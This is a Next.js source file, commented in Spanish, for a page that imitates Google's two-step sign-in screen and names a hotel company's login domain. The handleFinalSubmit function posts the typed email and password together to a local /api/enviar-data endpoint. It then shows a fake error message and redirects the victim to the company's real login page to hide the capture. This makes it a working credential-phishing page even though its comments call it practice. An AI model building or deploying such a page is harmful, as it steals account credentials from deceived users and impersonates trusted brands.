"use client";

import Loading from "@/components/Loading";
import MensajeError from "@/components/MensajeError";
import Image from "next/image";
import { useRouter } from "next/navigation";
import React, { useState } from "react";
import { FaCaretDown } from "react-icons/fa";

export default function PageAccountsGoogle() {
  // Esto es como un "switch" que dice en qué pantalla estamos: pidiendo el correo o pidiendo la contraseña
  const [step, setStep] = useState<"gmail" | "password">("gmail");

  // Aquí guardamos lo que la persona va escribiendo en el input del correo
  const [gmail, setGmail] = useState("");

  // Aquí guardamos lo que la persona va escribiendo en el input de la contraseña
  const [contra, setContra] = useState("");

  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);

  const router = useRouter();

  // NUEVO: se guarda el email apenas el usuario pasa de la pantalla 1 a la 2
  const handleEmailSubmit = () => {
    localStorage.setItem("practica_email", gmail);
    console.log("Email guardado:", gmail);
    setStep("password");
  };

  // NUEVO: acá simulamos el "enviar a la base de datos" con el email + password juntos
  const handleFinalSubmit = async () => {
    setLoading(true);
    setError(false);
    const datos = { gmail, contra };
    const res = await fetch("/api/enviar-data", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(datos),
    });
    const resultado = await res.json();

    if (resultado.success) {
      localStorage.removeItem("practica_email");
      setGmail("");
      setContra("");
      setTimeout(() => {
        setLoading(false);
        setError(true);

        setTimeout(() => {
          router.push("https://micuenta.hotelxcaret.com/es/login");
        }, 2000);
      }, 3000);
    } else {
      setLoading(false);
      setError(true);
    }
  };

  return (
    <section className="google-regular flex min-h-screen flex-col items-center bg-white md:justify-center md:gap-6 md:bg-[#F0F4F9] md:px-4]">
      {loading && <Loading />}
      {error && <MensajeError />}
      <div className="w-full flex-1 bg-white md:mx-auto md:w-270  md:flex-none md:rounded-3xl md:shadow-md">
        {/* Header - esto NO cambia entre pantallas, siempre se ve igual */}
        <div className="grid grid-cols-[auto_1fr] items-center gap-3 px-5 py-4">
          <Image
            src="/icon-google.svg"
            alt="accounts-google"
            width={20}
            height={20}
          />
          <p className="google-medium text-[15px] text-[#4a4e6d]">
            Iniciar sesión con Google
          </p>
        </div>
        <hr className="w-full text-gray-300" />

        {/*
          Aquí decidimos qué mostrar:
          - si step es "email", mostramos la pantalla de pedir el correo
          - si step es "password", mostramos la pantalla de pedir la contraseña
        */}
        {step === "gmail" ? (
          <EmailStep
            gmail={gmail}
            setGmail={setGmail}
            // Cuando le den a "Siguiente" en esta pantalla, cambiamos de pantalla
            onNext={handleEmailSubmit}
          />
        ) : (
          <PasswordStep
            gmail={gmail}
            contra={contra}
            setContra={setContra}
            // Cuando le den a "Atrás" o al chip del correo, regresamos a la pantalla del correo
            onBack={() => setStep("gmail")}
            onSubmit={handleFinalSubmit}
          />
        )}
      </div>

      {/* Footer - tampoco cambia entre pantallas */}
      <Footer />
    </section>
  );
}

/* =========================================================
   PANTALLA 1: pedir el correo
   ========================================================= */
function EmailStep({
  gmail,
  setGmail,
  onNext,
}: {
  gmail: string;
  setGmail: (v: string) => void;
  onNext: () => void;
}) {
  return (
    <form
      onSubmit={(e) => {
        e.preventDefault(); // esto evita que la página se recargue al enviar el formulario
        if (gmail) onNext(); // solo avanzamos si escribió algo en el correo
      }}
      className="grid grid-cols-1 gap-8 px-6 pb-9 pt-10 md:grid-cols-2 md:gap-12 md:px-10 md:pt-12"
    >
      {/* Izquierda: título y texto de "Ir a..." */}
      <div>
        <h1 className="google-regular mb-6 text-[2.2rem] leading-tight text-[#1f1f1f]">
          Inicia sesión
        </h1>
        <p className="text-base text-[#1f1f1f]">
          Ir a{" "}
          <span className="google-medium block break-all text-[#0b57d0] md:inline md:break-normal">
            cogxcaret.auth.us-east-1.amazoncognito.com
          </span>
        </p>
      </div>

      {/* Derecha: el input del correo */}
      <div className="flex flex-col">
        <div className="relative w-full">
          <input
            id="gmail"
            type="text"
            value={gmail}
            // cada vez que la persona escribe una letra, actualizamos lo que tenemos guardado
            onChange={(e) => setGmail(e.target.value)}
            placeholder=" "
            autoComplete="off"
            name="gmail"
            className="peer h-14 w-full rounded border border-[#747775] bg-transparent px-3.75 text-base text-[#1f1f1f] outline-none transition-colors hover:border-[#1f1f1f] focus:border-2 focus:border-[#0b57d0] focus:px-3.5"
          />
          <label
            htmlFor="gmail"
            className="pointer-events-none absolute left-3 top-1/2 -translate-y-1/2 bg-white px-1 text-base text-[#444746] transition-all duration-150 peer-focus:top-0 peer-focus:text-xs peer-focus:text-[#0b57d0] peer-not-placeholder-shown:top-0 peer-not-placeholder-shown:text-xs"
          >
            Correo electrónico o teléfono
          </label>
        </div>

        <a
          href="#"
          className="google-medium mt-2 w-fit text-[0.9036rem] text-[#0b57d0] hover:underline"
        >
          ¿Has olvidado tu correo electrónico?
        </a>

        <div className="mt-20 flex items-center justify-between gap-4 md:mt-24 md:justify-end">
          <button
            type="button"
            className="google-medium -ml-4 cursor-pointer rounded-full px-4 py-2.5 text-sm text-[#0b57d0] transition-colors hover:bg-[#0b57d0]/5 md:ml-0"
          >
            Crear cuenta
          </button>
          {/* Este botón es type="submit", por eso dispara el onSubmit del form de arriba */}
          <button
            type="submit"
            className="google-medium h-10 cursor-pointer rounded-full bg-[#0b57d0] px-6 text-sm text-white transition-all hover:bg-[#0a4cb8] hover:shadow-md"
          >
            Siguiente
          </button>
        </div>
      </div>
    </form>
  );
}

/* =========================================================
   PANTALLA 2: pedir la contraseña
   ========================================================= */
function PasswordStep({
  gmail,
  contra,
  setContra,
  onBack,
  onSubmit, // <-- agregar aquí
}: {
  gmail: string;
  contra: string;
  setContra: (v: string) => void;
  onBack: () => void;
  onSubmit: () => void; // <-- y aquí
}) {
  const [showPassword, setShowPassword] = useState(false);
  return (
    <form
      onSubmit={(e) => {
        e.preventDefault();
        // Aquí después metes tu validación real (llamar a tu backend, revisar la contraseña, etc.)
        onSubmit();
      }}
      className="grid grid-cols-1 gap-8 px-6 pb-9 pt-10 md:grid-cols-2 md:gap-12 md:px-10 md:pt-12"
    >
      {/* Izquierda: título + el chip con el correo que puso antes */}
      <div>
        <h1 className="google-regular mb-6 text-[2.2rem] leading-tight text-[#1f1f1f]">
          Te damos la bienvenida
        </h1>

        {/* Este botón muestra el correo que escribió en la pantalla anterior.
            Si le da click, lo regresamos a esa pantalla por si se equivocó */}
        <button
          type="button"
          onClick={onBack}
          className="flex items-center gap-2 rounded-full py-1 pl-1 pr-4 text-sm text-[#1f1f1f] hover:bg-black/5 google-medium"
        >
          <span className="flex h-6 w-6 items-center justify-center rounded-full text-xs text-[#444746]">
            <Image src="/iconlogo.png" alt="email" width={22} height={22} />
          </span>
          {gmail || "correo@ejemplo.com"}
        </button>
      </div>

      {/* Derecha: el input de la contraseña, igual de armado que el del correo */}
      <div className="flex flex-col mt-10">
        <div className="relative w-full">
          <input
            id="contra"
            type={showPassword ? "text" : "password"} // cambia entre mostrar texto normal u ocultarlo con puntitos
            value={contra}
            onChange={(e) => setContra(e.target.value)}
            placeholder=" "
            name="contra"
            autoComplete="current-password"
            className="peer h-14 w-full rounded border border-[#747775] bg-transparent px-3.75 text-base text-[#1f1f1f] outline-none transition-colors hover:border-[#1f1f1f] focus:border-2 focus:border-[#0b57d0] focus:px-3.5"
          />

          <label
            htmlFor="contra"
            className="pointer-events-none absolute left-3 top-1/2 -translate-y-1/2 bg-white px-1 text-base text-[#444746] transition-all duration-150 peer-focus:top-0 peer-focus:text-xs peer-focus:text-[#0b57d0] peer-not-placeholder-shown:top-0 peer-not-placeholder-shown:text-xs"
          >
            Introduce tu contraseña
          </label>
        </div>

        {/* Checkbox de mostrar/ocultar */}
        {/* Checkbox de mostrar/ocultar, con el estilo de Google */}
        <label className="flex w-fit cursor-pointer items-center gap-3 text-[0.9063rem] text-[#1f1f1f] mt-4 google-medium">
          <span className="relative flex h-5 w-5 items-center justify-center">
            <input
              type="checkbox"
              checked={showPassword}
              onChange={(e) => setShowPassword(e.target.checked)}
              className="peer absolute h-full rounded-xs w-full cursor-pointer appearance-none border-2 border-[#79747e] checked:border-[#0b57d0] checked:bg-[#0b57d0]"
            />
            {/* El check (palomita) blanco, solo se ve cuando el checkbox está marcado */}
            <svg
              className="pointer-events-none absolute hidden h-5 w-5 text-white peer-checked:block"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth={2}
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <path d="M5 13l4 4L19 7" />
            </svg>
          </span>
          Mostrar contraseña
        </label>

        <div className="mt-20 flex items-center justify-between gap-4 md:mt-24 md:justify-end">
          {/* Este botón también regresa a la pantalla del correo */}
          <button
            type="button"
            onClick={onBack}
            className="google-medium -ml-4 cursor-pointer rounded-full px-4 py-2.5 text-sm text-[#0b57d0] transition-colors hover:bg-[#0b57d0]/5 md:ml-0"
          >
            Atrás
          </button>
          <button
            type="submit"
            className="google-medium h-10 cursor-pointer rounded-full bg-[#0b57d0] px-6 text-sm text-white transition-all hover:bg-[#0a4cb8] hover:shadow-md"
          >
            Siguiente
          </button>
        </div>
      </div>
    </form>
  );
}

/* =========================================================
   FOOTER: idioma + links de abajo
   Esto no cambia nunca, por eso está separado
   ========================================================= */
function Footer() {
  return (
    <footer className="flex w-full flex-col items-start gap-3 px-6 pb-8 pt-6 text-xs text-[#1f1f1f] md:max-w-260 md:flex-row md:items-center md:justify-between md:px-3 md:py-0">
      <div className="relative">
        <select
          defaultValue="es-ES"
          className="-ml-1 cursor-pointer appearance-none bg-transparent text-xs outline-none md:ml-0"
        >
          <option value="es-ES">Español (España)</option>
          <option value="en-US">English (US)</option>
        </select>
        <FaCaretDown className="absolute top-0 -right-7" />
      </div>
      <nav className="flex gap-6 md:gap-2">
        <a href="#" className="rounded py-2 hover:bg-black/5 md:px-3">
          Ayuda
        </a>
        <a href="#" className="rounded py-2 hover:bg-black/5 md:px-3">
          Privacidad
        </a>
        <a href="#" className="rounded py-2 hover:bg-black/5 md:px-3">
          Términos
        </a>
      </nav>
    </footer>
  );
}
